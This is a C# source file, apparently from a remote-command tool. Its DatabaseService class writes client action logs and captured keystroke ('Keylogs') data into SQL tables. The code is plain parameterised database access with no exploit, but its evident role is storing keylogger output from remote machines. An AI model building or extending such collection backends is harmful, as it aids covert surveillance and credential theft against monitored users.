using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using SharedLibrary;

namespace RemoteCommand
{
    class DatabaseService
    {
        private string _connectionString;

        public DatabaseService(string connectionString)
        {
            _connectionString = connectionString;
        }

        public void SaveLog(string clientId, string action, string description)
        {
            using(SqlConnection con = DbConnectionManager.CreateConnection())
            {
                con.Open();

                string query = "INSERT INTO Logs (ClientId, Action, Description, Timestamp) VALUES (@c, @a, @d, @t)";
                SqlCommand cmd = new SqlCommand(query, con);


                cmd.Parameters.AddWithValue("@c", clientId);
                cmd.Parameters.AddWithValue("@a", action);
                cmd.Parameters.AddWithValue("@d", description);
                cmd.Parameters.AddWithValue("@t", DateTime.Now);

                cmd.ExecuteNonQuery();
            }
        }


        public void SaveKeylog(string clientId, string data)
        {
            using(SqlConnection con = DbConnectionManager.CreateConnection())
            {
                con.Open();

                string query = "INSERT INTO Keylogs (ClientId, KeyData, Timestamp) VALUES (@c, @d, @t)";

                SqlCommand cmd = new SqlCommand(query, con);

                cmd.Parameters.AddWithValue("@c", clientId);
                cmd.Parameters.AddWithValue("@d", data);
                cmd.Parameters.AddWithValue("@t", DateTime.Now);


                cmd.ExecuteNonQuery();
            }
        }
        
    }
}
